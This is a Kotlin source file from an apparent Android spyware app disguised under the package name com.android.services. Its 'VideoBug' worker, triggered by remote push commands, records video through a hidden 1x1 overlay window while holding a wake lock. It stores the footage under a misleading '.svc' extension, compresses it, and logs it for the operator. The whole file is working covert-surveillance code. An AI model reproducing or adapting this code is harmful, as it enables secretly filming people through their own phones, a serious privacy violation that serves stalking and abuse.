package com.android.services.workers.videobug

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaScannerConnection
import android.os.Handler
import android.os.PowerManager
import android.util.Log
import android.view.Gravity
import android.view.Surface
import android.view.SurfaceHolder
import android.view.WindowManager
import androidx.core.content.ContextCompat
import androidx.lifecycle.Observer
import androidx.lifecycle.ProcessLifecycleOwner
import androidx.work.Data
import androidx.work.WorkManager
import com.android.services.db.entities.VideoBug
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.VideoBugCommand
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.AutoFitSurfaceView
import com.android.services.util.OrientationLiveData
import com.android.services.util.getPreviewOutputSize
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.util.sizeInKb
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.FFmpeg
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

class VideoBugCommandProcessingBaseImpll(
    val context: Context,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : VideoBugCommandProcessingBase(context) {
    override fun initialize() {
        try {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} In Initialize() -> Ready to attach a Floating Window")
            ContextCompat.getMainExecutor(context).execute {
                mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                viewFinder = AutoFitSurfaceView(applicationContext)
                val layoutParams = WindowManager.LayoutParams(
                    1, 1,
                    windowManagerFlagOverlay,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT
                )
                layoutParams.gravity = Gravity.START or Gravity.TOP
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Attaching AutoFitTextureView to Window ")
                videoBugStatus = FcmPushStatus.INITIALIZED.getStatus()
                mWindowManager.addView(viewFinder, layoutParams)
            }
        } catch (exp: Exception) {
            logException(
                "${AppConstants.VIDEO_BUG_TYPE} Initialize() Error: ${exp.message}",
                throwable = exp
            )
            stopThisWorker()
        }
    }

    override fun parseIntent(data: Data?) {
        data?.let {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} In OnStartCommand -> Ready to start VideoBug Recording")
            val videoBugPushString = it.getString(VIDEO_BUG_PUSH)
            videoBugPush = Gson().fromJson(videoBugPushString, VideoBugCommand::class.java)
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} VideoBug Command = $videoBugPush")

            if (videoBugStatus != null) {
                videoBugPush?.let { push ->
                    acquireWakeLock()
                    intervalConsumed = 0
                    push.customData?.let { data -> customData = data }
                    viewFinder.holder.addCallback(object : SurfaceHolder.Callback {
                        override fun surfaceDestroyed(holder: SurfaceHolder) = Unit
                        override fun surfaceChanged(
                            holder: SurfaceHolder,
                            format: Int,
                            width: Int,
                            height: Int,
                        ) = Unit

                        override fun surfaceCreated(holder: SurfaceHolder) {
                            try {
                                // Selects appropriate preview size and configures view finder
                                val previewSize = getPreviewOutputSize(
                                    viewFinder.display,
                                    characteristics,
                                    SurfaceHolder::class.java
                                )
                                logVerbose(
                                    "${AppConstants.VIDEO_BUG_TYPE} View finder size: ${viewFinder.width} x ${viewFinder.height}"
                                )
                                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Selected preview size: $previewSize")
                                viewFinder.setAspectRatio(previewSize.width, previewSize.height)
                                // To ensure that size is set, initialize camera in the view's thread
                                viewFinder.post {
                                    initializeCamera()
                                }
                            } catch (exp: Exception) {
                                logException("${AppConstants.VIDEO_BUG_TYPE} surface created exception = ${exp.message}")
                            }
                        }
                    })

                    // Used to rotate the output media to match device orientation
//                    relativeOrientation = OrientationLiveData(context, characteristics).apply {
//                        observe(ProcessLifecycleOwner.get(), Observer { orientation ->
//                            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Orientation changed: $orientation")
//                        })
//                    }
                } ?: kotlin.run {
                    logVerbose(
                        "VideoBug Push is Null -> Stopping Service",
                        AppConstants.VIDEO_BUG_TYPE
                    )
                    stopThisWorker()
                }
            } else {
                updateVideoBugPushAsCorrupted()
            }
        } ?: kotlin.run {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} VideoBug Intent is Null ")
            AppUtils.appendLog(
                applicationContext,
                "VideoBugBug Intent is null, stopping service"
            )
            stopThisWorker()
        }
    }

    override fun createOutputFilePath(): String {
        mRecordingStartTime = System.currentTimeMillis()
        return AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_VIDEO_BUG,
            "$mRecordingStartTime.svc"
        )
    }

    @SuppressLint("ClickableViewAccessibility")
    private fun initializeCamera() = coroutineScope.launch(Dispatchers.Main) {
        try {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} cameraId = $cameraId")
            // Open the selected camera
            camera = openCamera(cameraManager, cameraId, cameraHandler)
            // Creates list of Surfaces where the camera will output frames
            val targets = listOf(viewFinder.holder.surface, recorderSurface)
            // Start a capture session using our open camera and list of Surfaces where frames will go
            session = createCaptureSession(camera, targets, cameraHandler)
            // Sends the capture request as frequently as possible until the session is torn down or
            //  session.stopRepeating() is called
            session.setRepeatingRequest(previewRequest, null, cameraHandler)
            startVideoRecording()
        } catch (exp: Exception) {
            logException("${AppConstants.VIDEO_BUG_TYPE} initializeCamera() exception = ${exp.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun openCamera(
        manager: CameraManager,
        cameraId: String,
        handler: Handler? = null,
    ): CameraDevice = suspendCancellableCoroutine { cont ->
        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(device: CameraDevice) = cont.resume(device)

            override fun onDisconnected(device: CameraDevice) {
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Camera $cameraId has been disconnected")
            }

            override fun onError(device: CameraDevice, error: Int) {
                val msg = when (error) {
                    ERROR_CAMERA_DEVICE -> "Fatal (device)"
                    ERROR_CAMERA_DISABLED -> "Device policy"
                    ERROR_CAMERA_IN_USE -> "Camera in use"
                    ERROR_CAMERA_SERVICE -> "Fatal (service)"
                    ERROR_MAX_CAMERAS_IN_USE -> "Maximum cameras in use"
                    else -> "Unknown"
                }
                val exc = RuntimeException("Camera $cameraId error: ($error) $msg")
                logException(
                    "${AppConstants.VIDEO_BUG_TYPE} Camera Error ${exc.message!!}",
                    throwable = exc
                )
                if (cont.isActive) {
                    logVerbose("${AppConstants.VIDEO_BUG_TYPE} Resuming with exception = ${exc.message}")
                    cont.resumeWithException(exc)
                }
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Stopping the Recording and setting file as corrupted")
                VideoBugCommandProcessingBase.videoBugStatus =
                    FcmPushStatus.FILE_CORRUPTED.getStatus()
                stopRecording()
            }
        }, handler)
    }

    /**
     * Creates a [CameraCaptureSession] and returns the configured session (as the result of the
     * suspend coroutine)
     */
    private suspend fun createCaptureSession(
        device: CameraDevice,
        targets: List<Surface>,
        handler: Handler? = null,
    ): CameraCaptureSession = suspendCoroutine { cont ->

        // Creates a capture session using the predefined targets, and defines a session state
        // callback which resumes the coroutine once the session is configured
        device.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {

            override fun onConfigured(session: CameraCaptureSession) = cont.resume(session)

            override fun onConfigureFailed(session: CameraCaptureSession) {
                val exc =
                    RuntimeException("${AppConstants.VIDEO_BUG_TYPE} Camera ${device.id} session configuration failed")
                logException(
                    "${AppConstants.VIDEO_BUG_TYPE} createCaptureSession failed = ${exc.message!!}",
                    throwable = exc
                )
                cont.resumeWithException(exc)
                logVerbose("${AppConstants.VIDEO_BUG_TYPE} Stopping the Recording and setting file as corrupted")
                VideoBugCommandProcessingBase.videoBugStatus =
                    FcmPushStatus.FILE_CORRUPTED.getStatus()
                stopRecording()
            }
        }, handler)
    }

    override fun stopRecording() {
        stopThisWorker()
    }

    /** This compresses the Output VideoBug File **/
    private suspend fun compressOutputFile(): String? {
        return try {
            if (AppConstants.osGreaterThanEqualToNougat) {
                withContext(Dispatchers.IO) {
                    val fileName = mFilePath.substringAfterLast("/").replace(".svc", ".mp4")
                    val destFile = "compress_$fileName"
                    val destFilePAth =
                        mFilePath.replace(mFilePath.substringAfterLast("/"), destFile)
                    //Old Command that was compressing 50%
//            val rc = FFmpeg.execute("-i $mFilePath -c:v mpeg4 $destFilePAth")

                    // Working commands
//            -y -i $mFilePath -ar 44100 -ac 2 -ab 48k -f mp3 $destFilePAth
                    // This command will compress the file 67%
                    logVerbose("size before compression = ${File(mFilePath).sizeInKb}")
                    val command = arrayOf(
                        "-y",
                        "-i",
                        mFilePath,
                        "-s",
                        "180x140",
                        "-vcodec",
                        "h264",
                        "-crf",
                        "28",
                        "-b:v",
                        "150k",
                        "-b:a",
                        "48000",
                        "-ac",
                        "2",
                        "-ar",
                        "22050",
                        destFilePAth
                    )
                    when (val rc = FFmpeg.execute(command)) {
                        Config.RETURN_CODE_SUCCESS -> {
                            logVerbose(
                                "Command execution completed successfully.",
                                AppConstants.VIDEO_BUG_TYPE
                            )
                            logVerbose("size after compression = ${File(destFilePAth).sizeInKb}")

                            destFilePAth
                        }

                        Config.RETURN_CODE_CANCEL -> {
                            logVerbose(
                                "Command execution cancelled by user.",
                                AppConstants.VIDEO_BUG_TYPE
                            )
                            null
                        }

                        else -> {
                            logVerbose(
                                String.format(
                                    "Command execution failed with rc=%d and the output below.",
                                    rc
                                ), AppConstants.VIDEO_BUG_TYPE
                            )
                            Config.printLastCommandOutput(Log.INFO)
                            null
                        }
                    }
                }
            } else null
        } catch (e: Exception) {
            null
        }
    }

    override fun onServiceDestroy() {
        logVerbose("${AppConstants.VIDEO_BUG_TYPE} In OnDestroy -> Releasing Resources")
        coroutineScope.launch(Dispatchers.Main) {
            try {
                stopVideoRecording()
                releaseResources()
                var destFile: String? = null
                try {
                    destFile = compressOutputFile()
                } catch (e: Exception) {
                    logVerbose("Exception while compressing the video bug e=$e")
                }
                reNameFile(applicationContext, mFilePath, destFile)
                insertVideoBug()
                shutDownExecutorService()
                removeWindow()
                releaseWakeLock()
            } catch (exp: Exception) {
                logException("${AppConstants.VIDEO_BUG_TYPE} onDestroy Exception = ${exp.message}")
                updateVideoBugPushAsCorrupted()
            }
        }
    }

    private suspend fun reNameFile(context: Context, sourceFile: String, destFile: String?) {
        withContext(Dispatchers.IO) {
            if (destFile != null) {
                AppUtils.reNameSourceFileWithDestFile(
                    context,
                    sourceFile,
                    destFile,
                    AppConstants.VIDEO_BUG_TYPE
                )
            } else {
                AppUtils.reNameFile(sourceFile, AppConstants.VIDEO_BUG_TYPE)
                logVerbose("compression destFile Path is Null", AppConstants.VIDEO_BUG_TYPE)
            }
        }
    }

    private fun shutDownExecutorService() {
        if (!executorService.isShutdown) {
            executorService.shutdown()
        }
    }

    private fun startVideoRecording() {
        session.setRepeatingRequest(recordRequest, null, cameraHandler)
        recorder.apply {
//            relativeOrientation.value?.let { setOrientationHint(it) }
            prepare()
            start()
        }
        logVerbose("${AppConstants.VIDEO_BUG_TYPE} Recording started")
    }

    @Throws(Exception::class)
    private suspend fun stopVideoRecording() {
        withContext(Dispatchers.IO) {
            recorder.stop()
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Recording stopped. Output file: $mFilePath")
            MediaScannerConnection.scanFile(
                applicationContext, arrayOf(mFilePath), null, null
            )
        }
    }

    @Throws(Exception::class)
    private suspend fun releaseResources() {
        withContext(Dispatchers.IO) {
            camera.close()
            cameraThread.quitSafely()
            recorder.release()
            recorderSurface.release()
        }
    }

    private suspend fun insertVideoBug() {
        withContext(Dispatchers.IO) {
            when (VideoBugCommandProcessingBase.videoBugStatus) {
                FcmPushStatus.SUCCESS.getStatus(), FcmPushStatus.INTERRUPTED.getStatus() -> {
                    val videoBug = VideoBug()
                    videoBug.file = mFilePath
                    videoBug.name = AppUtils.formatDateCustom(mRecordingStartTime.toString())
                    videoBug.cameraType = videoBugPush!!.cameraOption
                    videoBug.startDatetime = AppUtils.formatDate(mRecordingStartTime.toString())
                    videoBug.pushId = videoBugPush!!.pushId
                    videoBug.pushStatus = VideoBugCommandProcessingBase.videoBugStatus
                    videoBug.status = 0
                    localDatabaseSource.insertVideoBug(videoBug)
                }

                FcmPushStatus.INITIALIZED.getStatus() -> {
                    localDatabaseSource.updatePushStatus(
                        videoBugPush!!.pushId,
                        FcmPushStatus.FAILED.getStatus(),
                        0
                    )
                }

                else -> {
                    if (videoBugPush != null && VideoBugCommandProcessingBase.videoBugStatus != null) {
                        localDatabaseSource.updatePushStatus(
                            videoBugPush!!.pushId,
                            VideoBugCommandProcessingBase.videoBugStatus!!,
                            0
                        )
                        AppUtils.deleteFile(applicationContext, mFilePath)
                        logVerbose("${AppConstants.VIDEO_BUG_TYPE} VideoBug failed with status ${VideoBugCommandProcessingBase.videoBugStatus}")
                    }
                    return@withContext
                }
            }
        }
    }

    private fun updateVideoBugPushAsCorrupted() {
        VideoBugCommandProcessingBase.videoBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                localDatabaseSource.updatePushStatus(
                    videoBugPush!!.pushId,
                    VideoBugCommandProcessingBase.videoBugStatus!!,
                    0
                )
                AppUtils.deleteFile(applicationContext, mFilePath)
            }
        }
        stopThisWorker()
    }

    private fun acquireWakeLock() {
        val pm = context.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            VideoBugCommandProcessingBase.TAG_VIDEO_BUG_WAKE_LOCK
        )
        wakeLock!!.acquire((customData.toInt() * 60 * 1000).toLong())
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }

    private fun stopThisWorker() {
        WorkManager.getInstance(context).cancelUniqueWork(VIDEO_BUG_WORKER_TAG)
    }

    private fun removeWindow() {
        if (viewFinder.parent != null) {
            mWindowManager.removeViewImmediate(viewFinder)
        }
    }
}